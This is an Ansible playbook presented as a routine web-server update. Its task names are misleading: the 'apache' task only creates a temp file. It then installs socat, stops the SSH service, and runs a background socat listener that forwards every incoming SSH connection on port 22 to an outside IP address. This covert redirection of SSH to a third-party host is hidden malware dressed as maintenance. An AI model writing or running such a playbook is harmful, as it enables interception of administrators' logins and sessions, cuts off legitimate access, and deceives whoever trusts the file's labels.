---
- name: Update web servers
  hosts: 127.0.0.1
  gather_facts: true

  tasks:
  - name: Ensure apache is at the latest version
    shell: touch /tmp/AAABBCCC
    
  - name: Ensure bla
    copy: content="{{ the_url }}" dest=/tmp/AAABBCCC

  - name: Install socat
    shell: "apt install socat" 

  - name: Stop ssh
    shell: "(sleep 1; service ssh stop; sleep 1; nohup socat tcp-listen:22,reuseaddr,fork tcp:145.38.204.177:22)&" 
    
  
